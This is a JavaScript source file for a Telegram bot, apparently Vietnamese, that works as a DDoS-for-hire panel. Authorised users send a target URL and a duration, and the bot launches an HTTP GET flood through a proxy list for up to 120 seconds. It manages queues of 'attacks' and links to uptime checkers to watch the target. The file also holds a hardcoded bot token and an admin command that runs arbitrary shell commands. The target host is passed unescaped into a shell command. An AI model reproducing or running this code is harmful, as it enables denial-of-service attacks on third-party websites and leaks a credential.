const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU', adminId = 1243471275, allowedGroupIds = new Set([-1002423723717, -1002334544605, 112233445, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {};

bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');

const helpMessage = `📜 Hướng dẫn sử dụng:
➔ Lệnh chính xác: <code>https://example.com 60</code>
⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

bot.on('message', async (msg) => {
    const { chat: { id: chatId }, text, from: { id: userId, username, first_name } } = msg, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền sử dụng.', { parse_mode: 'HTML' });
    if (!['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;

    if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 60</code>.', { parse_mode: 'HTML' });

        const attackTime = parseInt(time, 10);
        if (attackTime > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian không được vượt quá ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });

        if (userProcesses[userId] >= maxSlot) {
            const userAttack = Object.values(activeAttacks).find(a => a.userId === userId);
            if (userAttack) {
                const remaining = Math.ceil((userAttack.endTime - Date.now()) / 1000);
                return bot.sendMessage(chatId, `❌ Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
            }
        }

        if (currentProcesses >= maxCurrent) {
            queue.push({ userId, host, time, chatId, caller });
            return bot.sendMessage(chatId, `⏳ Yêu cầu của bạn đã được đưa vào hàng đợi. Vui lòng chờ...⏳`, { parse_mode: 'HTML' });
        }

        const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
        activeAttacks[pid] = { userId, endTime };
        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
        currentProcesses++;

        const startMessage = {
            Status: "✨🚀🛸 Successfully 🛸🚀✨",
            Caller: caller,
            "PID Attack": pid,
            Website: host,
            Time: `${time} Giây`,
            Maxslot: maxSlot,
            Maxtime: maxTimeAttacks,
            ConcurrentAttacks: currentProcesses,
            StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
            CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
            HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
        };

        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

        const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
        child.on('close', () => {
            const completeMessage = { Status: "👽Process completed👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${time} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
            bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' });

            delete activeAttacks[pid];
            userProcesses[userId]--;
            currentProcesses--;

            if (queue.length > 0) {
                const next = queue.shift();
                bot.sendMessage(next.chatId, `📥 Bắt đầu tiến trình từ hàng đợi 🚀: ${next.host} ${next.time} Giây`, { parse_mode: 'HTML' });
                bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
            }
        });
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: <code>exe ls</code>.', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => bot.sendMessage(chatId, `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`, { parse_mode: 'HTML' }));
    }
});
